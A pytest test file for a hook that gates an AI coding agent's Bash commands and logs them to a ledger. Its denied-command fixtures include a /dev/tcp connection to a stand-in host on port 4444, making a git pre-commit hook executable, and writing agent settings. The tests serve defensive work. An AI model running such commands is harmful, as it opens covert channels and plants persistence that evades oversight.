"""A cooperating caller gates an inert callback; payload commands never run."""
import errno
import io
import json
import sys
from pathlib import Path

import pytest
from receiptd.hooks import claude_code_gate as gate

POLICY = Path(__file__).resolve().parents[1] / 'receiptd/hooks/v1_5.policy.json'


def call(tmp_path, monkeypatch, payload, *, policy=POLICY):
    monkeypatch.setenv('HOME', str(tmp_path))
    monkeypatch.setenv('RECEIPTD_KEY_DIR', str(tmp_path / 'keys'))
    monkeypatch.setenv('GIT_CONFIG_NOSYSTEM', '1')
    monkeypatch.setattr(sys, 'argv', ['gate', '--policy', str(policy), '--ledger', str(tmp_path / 'evidence/receipts.jsonl')])
    monkeypatch.setattr(sys, 'stdin', io.StringIO(json.dumps(payload)))
    return gate.main()


def callback_if_allowed(status, marker):
    if status == 0:
        marker.write_text('inert callback ran')


@pytest.mark.parametrize('command', ['chmod +x .git/hooks/pre-commit', 'bash -c "exec 3>/dev/tcp/203.0.113.5/4444"', 'echo fixture > .claude/settings.extra'])
def test_denied_callback_has_no_side_effect(tmp_path, monkeypatch, command):
    marker = tmp_path / 'marker'
    status = call(tmp_path, monkeypatch, {'tool_name': 'Bash', 'tool_input': {'command': command}})
    callback_if_allowed(status, marker)
    assert status == 2
    assert not marker.exists()


def test_allowed_callback_runs(tmp_path, monkeypatch):
    marker = tmp_path / 'marker'
    status = call(tmp_path, monkeypatch, {'tool_name': 'Bash', 'tool_input': {'command': 'echo fixture'}})
    callback_if_allowed(status, marker)
    assert status == 0 and marker.exists()


@pytest.mark.parametrize('failure', ['permission', 'full', 'lock', 'anchor'])
@pytest.mark.parametrize('command', ['echo fixture', 'chmod +x .git/hooks/pre-commit'])
def test_storage_failure_denies_without_callback(tmp_path, monkeypatch, failure, command):
    def fail(*args, **kwargs):
        if failure == 'permission':
            raise PermissionError('fixture storage denial')
        raise OSError(errno.ENOSPC, 'fixture storage full')
    target = {'permission': 'append_ledger_entry', 'full': 'append_ledger_entry', 'lock': 'lock_ledger', 'anchor': 'record_ledger_anchor'}[failure]
    monkeypatch.setattr(gate, target, fail)
    marker = tmp_path / 'marker'
    status = call(tmp_path, monkeypatch, {'tool_name': 'Bash', 'tool_input': {'command': command}})
    callback_if_allowed(status, marker)
    assert status == 2 and not marker.exists()
